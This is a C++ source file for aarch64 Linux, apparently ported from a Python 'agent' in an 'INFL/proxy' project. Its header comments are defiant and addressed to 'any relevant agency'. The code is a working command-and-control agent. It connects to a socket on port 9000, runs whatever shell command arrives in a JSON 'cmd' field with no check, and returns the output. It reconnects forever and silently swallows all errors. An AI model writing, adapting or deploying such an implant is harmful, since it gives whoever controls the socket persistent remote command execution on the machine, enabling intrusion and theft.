// agent.cpp \\
//* Ported from INFL/proxy/testing/agent.py
// C++ implementation customized for aarch64 Linux environments.
// Psyops is my territory—not syscalls. But MK-TAN doesn’t pause for comfort.
// To any relevant agency: review if you must. Underestimate at your own risk. *//
#include <iostream>
#include <string>
#include <vector>
#include <cstring>
#include <cstdlib>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>

std::string extract_cmd(const std::string& json_str) {
    size_t start = json_str.find("\"cmd\"");
    if (start == std::string::npos) return "";
    start = json_str.find(':', start);
    if (start == std::string::npos) return "";
    start = json_str.find('"', start);
    if (start == std::string::npos) return "";
    size_t end = json_str.find('"', start + 1);
    if (end == std::string::npos) return "";
    return json_str.substr(start + 1, end - start - 1);
}

std::string build_json(const std::string& output) {
    std::string json = "{\"output\":\"";
    for (char c : output) {
        if (c == '\\') json += "\\\\";
        else if (c == '"') json += "\\\"";
        else if (c == '\n') json += "\\n";
        else if (c == '\r') json += "\\r";
        else if (c == '\t') json += "\\t";
        else if ((unsigned char)c < 0x20) continue;
        else json += c;
    }
    json += "\"}";
    return json;
}

std::string run_cmd(const std::string& cmd) {
    std::string result;
    FILE* pipe = popen(cmd.c_str(), "r");
    if (!pipe) return "popen failed";
    char buffer[4096];
    while (fgets(buffer, sizeof(buffer), pipe))
        result += buffer;
    pclose(pipe);
    return result;
}

void handle() {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return;

    sockaddr_in addr{};
    addr.sin_family = AF_INET;
    addr.sin_port = htons(9000);
    inet_pton(AF_INET, "127.0.0.1", &addr.sin_addr);

    if (connect(sock, (sockaddr*)&addr, sizeof(addr)) < 0) {
        close(sock);
        return;
    }

    while (true) {
        uint32_t len_net;
        int r = recv(sock, &len_net, 4, MSG_WAITALL);
        if (r <= 0) break;
        uint32_t len = ntohl(len_net);

        std::vector<char> buf(len);
        r = recv(sock, buf.data(), len, MSG_WAITALL);
        if (r <= 0) break;

        std::string payload(buf.begin(), buf.end());
        std::string cmd = extract_cmd(payload);
        std::string output = run_cmd(cmd);
        std::string json = build_json(output);

        uint32_t out_len = htonl(json.size());
        send(sock, &out_len, 4, 0);
        send(sock, json.c_str(), json.size(), 0);
    }

    close(sock);
}

int main() {
    while (true) {
        try {
            handle();
        } catch (...) {
            // suppress all
        }
    }
    return 0;
}
